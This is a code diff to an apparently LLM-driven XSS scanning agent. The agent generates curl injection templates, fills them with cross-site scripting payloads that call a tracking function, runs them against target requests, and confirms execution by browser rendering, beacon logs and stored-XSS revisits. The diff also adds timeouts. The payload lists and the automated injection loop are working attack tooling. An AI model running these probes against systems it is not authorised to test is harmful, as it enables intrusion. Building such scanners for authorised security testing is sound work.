@@ -5,15 +5,23 @@ XSS Agent - uses LLM to identify injection points
 from typing import Dict, Any, List, Set
 from pathlib import Path
 import subprocess
+import os
 import random
 import string
 import json
 import re
-from attack_agent.request_utils import append_credentials_to_curl, check_beacon_detection
+import time
+from attack_agent.request_utils import (
+    append_credentials_to_curl,
+    check_beacon_detection,
+    kill_process_group_and_collect,
+)
 import shlex
 from config.llm_config import get_model_name, get_temperature
 from attack_agent.request_utils import extract_useful_response
-from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode, quote
+from urllib.parse import urljoin, urlsplit, urlunsplit, parse_qsl, urlencode, quote
+
+_UNLIMITED_TIMEOUT_VALUES = {"none", "inf", "infinite", "unlimited"}
 
 class XSSAgent:
     """
@@ -49,6 +57,10 @@ class XSSAgent:
 
         self.triggered_tokens: Set[str] = set()
         self.xss_array: Set[int] = set()
+        self.stored_verification_attempts: Dict[int, List[str]] = {}
+        self.stored_verification_hits: Dict[int, str] = {}
+        self.beacon_log_candidates = self._build_beacon_log_candidates()
+        self.deadline = None
 
     def _log(self, *args):
         msg = " ".join(str(a) for a in args)
@@ -58,9 +70,175 @@ class XSSAgent:
         except Exception:
             pass
 
+    def set_deadline(self, deadline):
+        self.deadline = deadline
+
+    def _deadline_exceeded(self) -> bool:
+        return self.deadline is not None and time.time() >= self.deadline
+
+    def _timeout_result(self, stage: int, payloads_tested: int = 0,
+                        random_id=None, curl_templates=None, extra=None) -> Dict[str, Any]:
+        result = {
+            "vulnerable": None,
+            "timeout": True,
+            "stage": stage,
+            "payloads_tested": payloads_tested,
+            "random_id": random_id,
+            "curl_templates": curl_templates or [],
+            "note": f"XSS task timeout during stage {stage}",
+            "error": f"XSS task timeout during stage {stage}",
+        }
+        if extra:
+            result.update(extra)
+        return result
+
     def _load_prompt_template(self) -> str:
         """Load XSS prompt template"""
         return self.xss_prompt_path.read_text(encoding="utf-8")
+
+    def _get_curl_timeout(self):
+        raw = os.environ.get("SEMSCANNER_CURL_TIMEOUT", "120")
+        normalized = str(raw).strip().lower()
+        if normalized in _UNLIMITED_TIMEOUT_VALUES:
+            return None
+        try:
+            timeout = int(float(normalized))
+        except ValueError:
+            self._log(f"[XSS] Invalid SEMSCANNER_CURL_TIMEOUT={raw!r}; using 120s")
+            return 120
+        return timeout if timeout > 0 else 120
+
+    def _get_render_timeout(self):
+        raw = os.environ.get("SEMSCANNER_XSS_RENDER_TIMEOUT", "60")
+        normalized = str(raw).strip().lower()
+        if normalized in _UNLIMITED_TIMEOUT_VALUES:
+            return None
+        try:
+            timeout = int(float(normalized))
+        except ValueError:
+            self._log(f"[XSS] Invalid SEMSCANNER_XSS_RENDER_TIMEOUT={raw!r}; using 60s")
+            return 60
+        return timeout if timeout > 0 else 60
+
+    def _build_beacon_log_candidates(self) -> List[Path]:
+        """
+        Build likely beacon log locations for this task.
+        Task logs live under <run>/output/attack_execution/tasks/TASKxxxx,
+        while listeners have been started with either <run>/http_captured.txt
+        or <run>/logs/http_captured.txt in different reproduction scripts.
+        """
+        candidates = []
+        for env_name in ("SEMSCANNER_XSS_BEACON_LOG", "XSS_BEACON_LOG", "BEACON_LOG_FILE"):
+            value = __import__("os").environ.get(env_name)
+            if value:
+                candidates.append(Path(value))
+
+        candidates.append(Path("http_captured.txt"))
+
+        for parent in [self.log_dir, *self.log_dir.parents]:
+            candidates.append(parent / "http_captured.txt")
+            candidates.append(parent / "logs" / "http_captured.txt")
+
+        deduped = []
+        seen = set()
+        for path in candidates:
+            key = str(path)
+            if key not in seen:
+                deduped.append(path)
+                seen.add(key)
+        return deduped
+
+    def _check_beacon(self, random_id: int) -> bool:
+        for path in self.beacon_log_candidates:
+            if check_beacon_detection(str(random_id), str(path)):
+                self._log(f"  [Beacon] Token {random_id} found in {path}")
+                self.triggered_tokens.add(str(random_id))
+                return True
+        return False
+
+    def _stored_xss_candidate_urls(self, request: Dict[str, Any]) -> List[str]:
+        """Return conservative, same-origin display pages for immediate stored-XSS checks."""
+        method = str(request.get("method", "GET")).upper()
+        if method not in {"POST", "PUT", "PATCH"}:
+            return []
+
+        request_url = str(request.get("url", ""))
+        request_parts = urlsplit(request_url)
+        if not request_parts.scheme or not request_parts.netloc:
+            return []
+
+        headers = request.get("headers") or {}
+        referer = next(
+            (str(value) for key, value in headers.items() if str(key).lower() == "referer" and value),
+            "",
+        )
+        if not referer:
+            return []
+
+        candidate = urljoin(request_url, referer)
+        parts = urlsplit(candidate)
+        if (parts.scheme.lower(), parts.netloc.lower()) != (
+            request_parts.scheme.lower(),
+            request_parts.netloc.lower(),
+        ):
+            self._log(f"  [Stored Verification] Skipping cross-origin Referer: {candidate}")
+            return []
+
+        candidate = urlunsplit((parts.scheme, parts.netloc, parts.path or "/", parts.query, ""))
+        candidate_lower = candidate.lower()
+        dangerous_keywords = (
+            "logout", "signout", "logoff", "delete", "remove", "destroy",
+            "erase", "purge", "drop", "reset", "deactivate", "unsubscribe",
+        )
+        if any(keyword in candidate_lower for keyword in dangerous_keywords):
+            self._log(f"  [Stored Verification] Skipping potentially destructive Referer: {candidate}")
+            return []
+
+        return [candidate]
+
+    def _visit_stored_xss_candidates(self, request: Dict[str, Any], random_id: int,
+                                     template_index: int = 0, payload_index: int = 0) -> bool:
+        """Immediately visit likely display pages before later attacks can overwrite the payload."""
+        if not self.driver:
+            return False
+
+        candidates = self._stored_xss_candidate_urls(request)
+        if not candidates:
+            return False
+
+        attempts = self.stored_verification_attempts.setdefault(random_id, [])
+        for candidate in candidates:
+            if self._deadline_exceeded():
+                self._log("  [Stored Verification] Deadline reached before candidate visit")
+                return False
+
+            if candidate not in attempts:
+                attempts.append(candidate)
+
+            self._log(f"  [Stored Verification] Visiting captured Referer: {candidate}")
+            try:
+                self.driver.get(candidate)
+                time.sleep(0.5)
+                self._save_screenshot(random_id, template_index, payload_index)
+
+                if self._check_beacon(random_id):
+                    self.stored_verification_hits[random_id] = candidate
+                    self._log(f"  [Stored Verification] XSS triggered via beacon at {candidate}")
+                    return True
+
+                try:
+                    arr = self.driver.execute_script("return window.xss_array || [];")
+                    if random_id in arr:
+                        self.xss_array.add(random_id)
+                        self.stored_verification_hits[random_id] = candidate
+                        self._log(f"  [Stored Verification] XSS triggered via xss_array at {candidate}")
+                        return True
+                except Exception as e:
+                    self._log(f"  [Stored Verification] Failed to inspect xss_array: {e}")
+            except Exception as e:
+                self._log(f"  [Stored Verification] Candidate visit failed: {e}")
+
+        return False
 
     def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
         """
@@ -88,6 +266,8 @@ class XSSAgent:
         self._log(f"{'='*70}\n")
 
         result_stage1 = self._execute_stage1(request, credentials)
+        if result_stage1.get("timeout"):
+            return result_stage1
 
         if result_stage1.get("vulnerable") is True:
             self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
@@ -96,6 +276,16 @@ class XSSAgent:
         if not self.reflection_enabled:
             self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
             return result_stage1
+
+        if self._deadline_exceeded():
+            self._log("[XSS] Deadline reached before Stage 2; returning timeout result")
+            return self._timeout_result(
+                stage=2,
+                payloads_tested=result_stage1.get("payloads_tested", 0),
+                random_id=result_stage1.get("random_id"),
+                curl_templates=result_stage1.get("curl_templates", []),
+                extra={"stage1_results": result_stage1}
+            )
 
         self._log(f"\n{'='*70}")
         self._log(f"[STAGE 2: Reflective Attack]")
@@ -167,8 +357,20 @@ class XSSAgent:
         self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}")
         self._log(f"")
 
+        if self._deadline_exceeded():
+            self._log("[XSS] Deadline reached before Stage 1 LLM analysis")
+            return self._timeout_result(stage=1)
+
         self._log(f"[Step 1: Calling LLM to Identify Injection Points]")
         curl_templates, llm_analysis = self._generate_curl_templates(request)
+
+        if self._deadline_exceeded():
+            self._log("[XSS] Deadline reached after Stage 1 LLM analysis")
+            return self._timeout_result(
+                stage=1,
+                curl_templates=curl_templates,
+                extra={"llm_analysis": llm_analysis}
+            )
 
         if not curl_templates:
             self._log(f"[XSS] No injection points identified by LLM")
@@ -205,15 +407,39 @@ class XSSAgent:
         vulnerable = False
         any_payload_reflected = False
 
-        for template in curl_templates:
-            self._log(f"\n[Testing Template]: {template}")
+        # Payload-first ordering gives the highest-value, most broadly useful
+        # probes a chance against every candidate injection point early.
+        for payload_index, payload in enumerate(xss_payloads, 1):
+            if self._deadline_exceeded():
+                self._log("[XSS] Deadline reached before next Stage 1 payload")
+                return self._timeout_result(
+                    stage=1,
+                    payloads_tested=payloads_tested,
+                    random_id=random_id,
+                    curl_templates=curl_templates,
+                    extra={"llm_analysis": llm_analysis}
+                )
 
-            for payload in xss_payloads:
+            self._log(f"\n[Testing Payload Across Templates]: {payload}")
+
+            for template_index, template in enumerate(curl_templates, 1):
+                if self._deadline_exceeded():
+                    self._log("[XSS] Deadline reached before next Stage 1 template")
+                    return self._timeout_result(
+                        stage=1,
+                        payloads_tested=payloads_tested,
+                        random_id=random_id,
+                        curl_templates=curl_templates,
+                        extra={"llm_analysis": llm_analysis}
+                    )
+
+                self._log(f"[Testing Template]: {template}")
+
                 if '{PAYLOAD}' not in template:
                     self._log(f"   Template missing {{PAYLOAD}} placeholder, skipping")
                     continue
 
-                final_command = template.replace('{PAYLOAD}', payload)
+                final_command = self._inject_payload(template, payload)
                 injected_url = self._extract_url_from_curl(final_command)
                 safe_url = self._sanitize_url_for_http(injected_url)
                 if safe_url != injected_url:
@@ -222,6 +448,7 @@ class XSSAgent:
                 final_command = self._ensure_curl_include_headers(final_command)
 
                 final_command = append_credentials_to_curl(final_command, credentials)
+                final_command = self._normalize_xss_curl_command(final_command)
 
                 self.execution_records[random_id] = {
                     "random_id": random_id,
@@ -237,14 +464,7 @@ class XSSAgent:
                 self._log(f"  [Command]: {final_command}")
 
                 try:
-                    process = subprocess.Popen(
-                        final_command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    stdout, stderr = process.communicate(timeout=10)
+                    stdout, stderr, returncode = self._execute_curl_command(final_command)
 
                     http_status, headers, body = self._parse_curl_response(stdout)
 
@@ -254,7 +474,7 @@ class XSSAgent:
                         any_payload_reflected = True
                         self._log(f"   [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
                         
-                    self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
+                    self._log(f"  ✓ Executed via curl (curl_exit_code: {returncode})")
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
                     self._log(f"  Body length: {len(body)} bytes")
@@ -268,16 +488,31 @@ class XSSAgent:
                     self._log(f"  Is HTML: {is_html}")
 
                     if is_html and self.driver:
-                        if self._render_and_check_xss(body, random_id):
+                        if self._render_and_check_xss(body, random_id, template_index, payload_index):
                             self._log(f"  XSS confirmed, stopping further tests for this request")
                             vulnerable = True
                             payloads_tested += 1
                             break
 
+                    if (
+                        not vulnerable
+                        and returncode == 0
+                        and http_status is not None
+                        and 200 <= http_status < 400
+                        and self._visit_stored_xss_candidates(
+                            request,
+                            random_id,
+                            template_index=template_index,
+                            payload_index=payload_index,
+                        )
+                    ):
+                        self._log(f"  Stored XSS confirmed, stopping further tests for this request")
+                        vulnerable = True
+                        payloads_tested += 1
+                        break
+
                     payloads_tested += 1
 
-                except subprocess.TimeoutExpired:
-                    self._log(f"  ✗ Timeout after 10 seconds")
                 except Exception as e:
                     self._log(f"  ✗ Failed: {e}")
 
@@ -286,9 +521,9 @@ class XSSAgent:
 
         self._log(f"\n[Step 5: Checking Beacon Detection]")
         if not vulnerable:
-            vulnerable = check_beacon_detection(str(random_id))
+            vulnerable = self._check_beacon(random_id)
         else:
-            if check_beacon_detection(str(random_id)):
+            if self._check_beacon(random_id):
                 self._log(f"  (Beacon also confirms XSS for Random ID {random_id})")
 
         if not vulnerable and random_id in self.xss_array:
@@ -310,7 +545,7 @@ class XSSAgent:
         
         self._log(f"  Result: {final_status}")
         
-        return {
+        result = {
             "vulnerable": vulnerable,
             "is_reflected": any_payload_reflected,
             "stage": 1,
@@ -320,6 +555,13 @@ class XSSAgent:
             "llm_analysis": llm_analysis,
             "note": f"Stage 1 - Result: {final_status}. (Reflected: {any_payload_reflected}, Executed: {vulnerable})"
         }
+        attempted_urls = self.stored_verification_attempts.get(random_id, [])
+        if attempted_urls:
+            result["stored_verification_urls"] = attempted_urls
+        if random_id in self.stored_verification_hits:
+            result["detection_method"] = "immediate_stored_referer"
+            result["stored_verification_hit"] = self.stored_verification_hits[random_id]
+        return result
 
     def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
         """
@@ -392,114 +634,175 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                 break
 
         if commands_line_idx == -1:
-            self._log(f"[Warning] No Commands section found in LLM output")
-            return []
+            self._log(f"[Warning] No Commands section found; scanning full LLM output")
+            command_lines = lines
+        else:
+            command_lines = lines[commands_line_idx + 1:]
 
-        for i in range(commands_line_idx + 1, len(lines)):
-            line = lines[i].strip()
+        current_parts = []
+        seen = set()
 
-            if not line:
+        def add_candidate(parts):
+            candidate = " ".join(part.strip() for part in parts if part.strip()).strip()
+            if self._is_valid_curl_template(candidate) and candidate not in seen:
+                templates.append(candidate)
+                seen.add(candidate)
+
+        for raw_line in command_lines:
+            line = raw_line.strip()
+
+            if not line or line.startswith('```'):
+                # An outstanding continuation cannot legitimately terminate at
+                # a blank line or a Markdown fence; discard the partial command.
+                if current_parts:
+                    current_parts = []
                 continue
 
-            if line.startswith('```'):
+            curl_match = re.search(r'(?<![\w-])curl(?=\s|$)', line)
+            if curl_match:
+                if current_parts:
+                    current_parts = []
+                line = line[curl_match.start():].strip().strip('`').strip()
+            elif not current_parts:
                 continue
 
-            if 'curl' in line and '{PAYLOAD}' in line:
-                cleaned = line.lstrip('`').rstrip('`').strip()
-                templates.append(cleaned)
+            has_continuation = line.rstrip().endswith('\\')
+            if has_continuation:
+                line = line.rstrip()[:-1].rstrip()
+
+            current_parts.append(line)
+
+            if not has_continuation:
+                add_candidate(current_parts)
+                current_parts = []
+
+        # Do not add current_parts here: a command left in the accumulator had
+        # a trailing backslash and is therefore incomplete.
 
         if not templates:
             self._log(f"[Warning] No valid curl commands found after Commands section")
 
         return templates
 
+    def _is_valid_curl_template(self, curl_command: str) -> bool:
+        """Reject incomplete or non-executable curl templates before testing."""
+        if not curl_command or curl_command.rstrip().endswith('\\'):
+            return False
+
+        try:
+            args = shlex.split(curl_command)
+        except ValueError:
+            return False
+
+        if not args or args[0] != 'curl':
+            return False
+        if '{PAYLOAD}' not in curl_command:
+            return False
+        return any(re.search(r'https?://', arg, re.IGNORECASE) for arg in args[1:])
+
+    @staticmethod
+    def _inject_payload(curl_template: str, payload: str) -> str:
+        """Insert a payload without letting its quotes corrupt shell parsing."""
+        try:
+            args = shlex.split(curl_template)
+        except ValueError:
+            return curl_template.replace('{PAYLOAD}', payload)
+
+        injected_args = [arg.replace('{PAYLOAD}', payload) for arg in args]
+        return shlex.join(injected_args)
+
+    @staticmethod
+    def _iter_payload_template_pairs(payloads, templates):
+        """Yield every test pair in payload-first order."""
+        for payload in payloads:
+            for template in templates:
+                yield payload, template
+
+    def _normalize_xss_curl_command(self, curl_command: str) -> str:
+        """
+        Normalize curl generated for XSS probes before execution.
+
+        XSS payloads often start with '<'. With curl -F, values like
+        field=<img... are interpreted as "read this local file". For XSS tests
+        these multipart fields must be literal strings, so use --form-string.
+        """
+        try:
+            args = shlex.split(curl_command)
+        except ValueError:
+            return curl_command
+
+        if not args or args[0] != "curl":
+            return curl_command
+
+        normalized = ["curl"]
+        skip_next = False
+        for arg in args[1:]:
+            if skip_next:
+                skip_next = False
+                continue
+            if arg in ("--connect-timeout", "--max-time"):
+                skip_next = True
+                continue
+            if arg.startswith("--connect-timeout=") or arg.startswith("--max-time="):
+                continue
+            if arg in ("-F", "--form"):
+                normalized.append("--form-string")
+            else:
+                normalized.append(arg)
+
+        return " ".join(shlex.quote(arg) for arg in normalized)
+
+    def _execute_curl_command(self, curl_command: str):
+        args = shlex.split(curl_command)
+        timeout = self._get_curl_timeout()
+        process = subprocess.Popen(
+            args,
+            shell=False,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            start_new_session=True
+        )
+        try:
+            stdout, stderr = process.communicate(timeout=timeout) if timeout is not None else process.communicate()
+            return stdout, stderr, process.returncode
+        except subprocess.TimeoutExpired:
+            stdout, stderr, cleanup_complete = kill_process_group_and_collect(process)
+            cleanup_note = "process group killed"
+            if not cleanup_complete:
+                cleanup_note += "; pipe cleanup exceeded 3 seconds and was abandoned"
+            stderr = (stderr or "") + f"\nTimeout after {timeout} seconds; {cleanup_note}"
+            return stdout or "", stderr, 124
+
     def _get_xss_payloads(self, random_id: int) -> List[str]:
         """
-        Generate XSS payload list (covers multiple injection contexts and encodings)
+        Generate a compact XSS payload list covering distinct injection contexts.
 
         Args:
             random_id: random ID sent to beacon and stored in xss_array
 
         Returns:
-            Returns payload list categorized by context (with encoding variants)
+            Returns payload list ordered from broadly useful to context-specific
         """
-        payloads = []
-
-        payloads.extend([
-            f'<img src="x" onerror="xss({random_id})">',
-            f'<svg onload="xss({random_id})">',
-            f'<body onload="xss({random_id})">',
-            f'<iframe onload="xss({random_id})"></iframe>',
-            f'<video onloadstart="xss({random_id})"><source></video>',
-            f'<audio onloadstart="xss({random_id})"><source></audio>'
-        ])
-
-        payloads.extend([
-            f'<a href="javascript:xss({random_id})">click</a>',
-            f'<iframe src="javascript:xss({random_id})"></iframe>',
-            f'<form action="javascript:xss({random_id})"><input type="submit"></form>',
-            f'<object data="javascript:xss({random_id})">',
-        ])
-
-        payloads.extend([
-            f'x" onerror="xss({random_id})" z="',
-            f'x" onload="xss({random_id})" z="',
-            f'x" onfocus="xss({random_id})" autofocus z="'
-        ])
-
-        payloads.extend([
-            f"x' onerror='xss({random_id})' z='",
-            f"x' onload='xss({random_id})' z='"
-        ])
-
-        payloads.extend([
-            f"x onclick=xss({random_id}) z=",
-            f"x onload=xss({random_id}) z=",
-        ])
-
-        payloads.extend([
-            f"</title><script>xss({random_id})</script>",
-            f"</textarea><script>xss({random_id})</script>",
-            f"</style><script>xss({random_id})</script>",
-            f"</noscript><script>xss({random_id})</script>",
-            f"</script><script>xss({random_id})</script>",
-        ])
-
-        payloads.extend([
-            f"--><script>xss({random_id})</script><!--",
-            f"--!><script>xss({random_id})</script><!--",
-        ])
-
-        payloads.extend([
+        return [
+            # HTML element body: common, auto-triggering baseline probe.
+            f'<img src=x onerror=xss({random_id})>',
+            # SVG parsing context.
+            f'<svg onload=xss({random_id})>',
+            # Double-quoted, single-quoted, and unquoted attribute values.
+            f'x" onerror="xss({random_id})" x="',
+            f"x' onerror='xss({random_id})' x='",
+            f'x onfocus=xss({random_id}) autofocus x=',
+            # Raw-text elements (the browser ignores non-matching end tags).
+            f'</title></textarea></style><img src=x onerror=xss({random_id})>',
+            # Script element data context.
+            f'</script><img src=x onerror=xss({random_id})>',
+            # JavaScript single- and double-quoted string contexts.
             f"';xss({random_id});//",
-            f"\";xss({random_id});//",
-            f"`;xss({random_id});//",
-            f"</script><script>xss({random_id})</script><script>"
-        ])
-
-        payloads.extend([
-            f";xss({random_id})//",
-            f",xss({random_id})//",
-            f");xss({random_id});//",
-        ])
-
-        payloads.extend([
-            f'x;color:red;}}</style><script>xss({random_id})</script><style>',
-            f"x:expression(xss({random_id}))",
-        ])
-
-        payloads.extend([
-            f'<input onfocus="xss({random_id})" autofocus>',
-            f'<embed src="javascript:xss({random_id})">',
-            f'<use xlink:href="javascript:xss({random_id})"></use>',
-        ])
-
-        payloads.extend([
-            f"<script>xss({random_id})</script>",
-            f'"><scrIpt>xss({random_id});</scRipt>'
-        ])
-
-        return payloads
+            f'";xss({random_id});//',
+            # HTML comment context.
+            f'--><img src=x onerror=xss({random_id})><!--',
+        ]
 
     def _ensure_curl_include_headers(self, curl_command: str) -> str:
         """
@@ -538,24 +841,37 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _is_html_response(self, headers: dict, body: str) -> bool:
         """
-        HTML:
-        -  Content-Type
-        -
+        Decide whether the curl response body is actual HTML worth rendering.
+
+        curl commands append an HTTP_STATUS marker in some paths. That marker
+        must not make a plain response look renderable.
         """
+        html_markers = (
+            '<!doctype html',
+            '<html',
+            '<head',
+            '<body',
+            '<script',
+            '<svg',
+            '<img',
+            '<iframe',
+            '<form',
+        )
+
         content_type = headers.get('content-type', '').lower()
+        body = re.sub(r'\r?\nHTTP_STATUS:\d{3}\s*$', '', body or '').strip()
+        body_lower = body.lower()[:2000]
+
+        if not body_lower:
+            return False
+
+        body_has_html = any(marker in body_lower for marker in html_markers)
 
         if 'text/html' in content_type:
-            return True
+            return body_has_html
 
         if content_type == '' or 'text/' in content_type:
-            body_lower = body.lower().strip()[:1000]
-            return any([
-                '<!doctype html' in body_lower,
-                '<html' in body_lower,
-                '<head' in body_lower,
-                '<body' in body_lower,
-                body_lower.startswith('<html'),
-            ])
+            return body_has_html
 
         return False
 
@@ -603,6 +919,28 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             return False
 
         try:
+            render_timeout = self._get_render_timeout()
+            if self.deadline is not None:
+                remaining = self.deadline - time.time()
+                if remaining <= 0:
+                    self._log("  [SKIP RENDER] XSS task deadline already exceeded")
+                    return False
+                if render_timeout is None:
+                    render_timeout = max(1, int(remaining))
+                else:
+                    render_timeout = max(1, min(render_timeout, int(remaining)))
+
+            if render_timeout is not None:
+                try:
+                    self.driver.set_page_load_timeout(render_timeout)
+                    self.driver.set_script_timeout(render_timeout)
+                    command_executor = getattr(self.driver, "command_executor", None)
+                    if command_executor and hasattr(command_executor, "set_timeout"):
+                        command_executor.set_timeout(render_timeout + 5)
+                    self._log(f"  [Render Timeout Configured]: {render_timeout}s")
+                except Exception as e:
+                    self._log(f"  [Render Timeout Configuration Failed]: {e}")
+
             # 1. HTML -> base64 data URL
             b64_html = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
             data_url = f"data:text/html;base64,{b64_html}"
@@ -615,9 +953,8 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             if screenshot_saved:
                 self._log(f"  📸 Screenshot saved")
 
-            if check_beacon_detection(str(random_id)):
+            if self._check_beacon(random_id):
                 self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id}")
-                self.triggered_tokens.add(str(random_id))
                 return True
 
             try:
@@ -686,6 +1023,16 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         """
         Execute Stage 2 reflection attack (curl + HTML rendering)
         """
+        if self._deadline_exceeded():
+            self._log("[XSS] Deadline reached before Stage 2 reflection analysis")
+            return self._timeout_result(
+                stage=2,
+                payloads_tested=stage1_context.get("payloads_tested", 0),
+                random_id=stage1_context.get("random_id"),
+                curl_templates=stage1_context.get("curl_templates", []),
+                extra={"stage1_results": stage1_context}
+            )
+
         self._log(f"[Reflection] Building reflection analysis...")
         reflection_suffix = self._build_reflection_suffix(stage1_context)
 
@@ -694,6 +1041,18 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             request=request,
             reflection_suffix=reflection_suffix
         )
+
+        if self._deadline_exceeded():
+            self._log("[XSS] Deadline reached after Stage 2 LLM analysis")
+            return self._timeout_result(
+                stage=2,
+                curl_templates=new_templates,
+                extra={
+                    "llm_reflection_output": llm_reflection_output,
+                    "reflection_analysis": reflection_suffix,
+                    "stage1_results": stage1_context
+                }
+            )
 
         if not new_templates:
             self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
@@ -724,15 +1083,46 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         vulnerable = False
         any_payload_reflected = False
 
-        for template in new_templates:
-            self._log(f"\n[Testing Template]: {template}")
+        # Keep the same payload-first ordering as Stage 1.
+        for payload_index, payload in enumerate(xss_payloads, 1):
+            if self._deadline_exceeded():
+                self._log("[XSS] Deadline reached before next Stage 2 payload")
+                return self._timeout_result(
+                    stage=2,
+                    payloads_tested=payloads_tested,
+                    random_id=random_id,
+                    curl_templates=new_templates,
+                    extra={
+                        "llm_reflection_output": llm_reflection_output,
+                        "reflection_analysis": reflection_suffix,
+                        "stage1_results": stage1_context
+                    }
+                )
 
-            for payload in xss_payloads:
+            self._log(f"\n[Testing Payload Across Templates]: {payload}")
+
+            for template_index, template in enumerate(new_templates, 1):
+                if self._deadline_exceeded():
+                    self._log("[XSS] Deadline reached before next Stage 2 template")
+                    return self._timeout_result(
+                        stage=2,
+                        payloads_tested=payloads_tested,
+                        random_id=random_id,
+                        curl_templates=new_templates,
+                        extra={
+                            "llm_reflection_output": llm_reflection_output,
+                            "reflection_analysis": reflection_suffix,
+                            "stage1_results": stage1_context
+                        }
+                    )
+
+                self._log(f"[Testing Template]: {template}")
+
                 if '{PAYLOAD}' not in template:
                     self._log(f"   Template missing {{PAYLOAD}} placeholder, skipping")
                     continue
 
-                final_command = template.replace('{PAYLOAD}', payload)
+                final_command = self._inject_payload(template, payload)
                 injected_url = self._extract_url_from_curl(final_command)
                 safe_url = self._sanitize_url_for_http(injected_url)
                 if safe_url != injected_url:
@@ -742,6 +1132,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                 final_command = self._ensure_curl_include_headers(final_command)
 
                 final_command = append_credentials_to_curl(final_command, credentials)
+                final_command = self._normalize_xss_curl_command(final_command)
 
                 self.execution_records[random_id] = {
                     "random_id": random_id,
@@ -757,14 +1148,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                 self._log(f"  [Command]: {final_command}")
 
                 try:
-                    process = subprocess.Popen(
-                        final_command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    stdout, stderr = process.communicate(timeout=10)
+                    stdout, stderr, returncode = self._execute_curl_command(final_command)
 
                     http_status, headers, body = self._parse_curl_response(stdout)
 
@@ -774,7 +1158,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                         any_payload_reflected = True
                         self._log(f"   [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
 
-                    self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
+                    self._log(f"  ✓ Executed via curl (curl_exit_code: {returncode})")
                     if http_status is not None:
                         self._log(f"  HTTP Status: {http_status}")
                     self._log(f"  Body length: {len(body)} bytes")
@@ -788,16 +1172,31 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                     self._log(f"  Is HTML: {is_html}")
 
                     if is_html and self.driver:
-                        if self._render_and_check_xss(body, random_id):
+                        if self._render_and_check_xss(body, random_id, template_index, payload_index):
                             self._log(f"  XSS confirmed in Stage 2, stopping further tests")
                             vulnerable = True
                             payloads_tested += 1
                             break
 
+                    if (
+                        not vulnerable
+                        and returncode == 0
+                        and http_status is not None
+                        and 200 <= http_status < 400
+                        and self._visit_stored_xss_candidates(
+                            request,
+                            random_id,
+                            template_index=template_index,
+                            payload_index=payload_index,
+                        )
+                    ):
+                        self._log(f"  Stored XSS confirmed in Stage 2, stopping further tests")
+                        vulnerable = True
+                        payloads_tested += 1
+                        break
+
                     payloads_tested += 1
 
-                except subprocess.TimeoutExpired:
-                    self._log(f"  ✗ Timeout after 10 seconds")
                 except Exception as e:
                     self._log(f"  ✗ Failed: {e}")
 
@@ -806,16 +1205,14 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
         self._log(f"\n[Step 5: Checking Beacon Detection]")
         if not vulnerable:
-            if check_beacon_detection(str(random_id)):
+            if self._check_beacon(random_id):
                 self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
-                self.triggered_tokens.add(str(random_id))
                 vulnerable = True
             else:
                 self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")
         else:
-            if check_beacon_detection(str(random_id)):
+            if self._check_beacon(random_id):
                 self._log(f"  (Beacon also confirms XSS for Random ID {random_id})")
-                self.triggered_tokens.add(str(random_id))
 
         if not vulnerable and random_id in self.xss_array:
             self._log(f"  ✓ XSS_ARRAY DETECTION: Random ID {random_id} found!")
@@ -837,7 +1234,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         self._log(f"  Result: {final_status}")
 
 
-        return {
+        result = {
             "vulnerable": vulnerable,
             "is_reflected": any_payload_reflected,
             "stage": 2,
@@ -854,6 +1251,13 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             },
             "note": f"Stage 2 - Reflection attack: {'XSS confirmed' if vulnerable else 'Safe in immediate tests'}"
         }
+        attempted_urls = self.stored_verification_attempts.get(random_id, [])
+        if attempted_urls:
+            result["stored_verification_urls"] = attempted_urls
+        if random_id in self.stored_verification_hits:
+            result["detection_method"] = "immediate_stored_referer"
+            result["stored_verification_hit"] = self.stored_verification_hits[random_id]
+        return result
 
     def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
         """
@@ -994,7 +1398,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         updates = {}
 
         for random_id in self.execution_records.keys():
-            beacon_triggered = check_beacon_detection(str(random_id))
+            beacon_triggered = self._check_beacon(random_id)
 
             array_triggered = random_id in self.xss_array
 
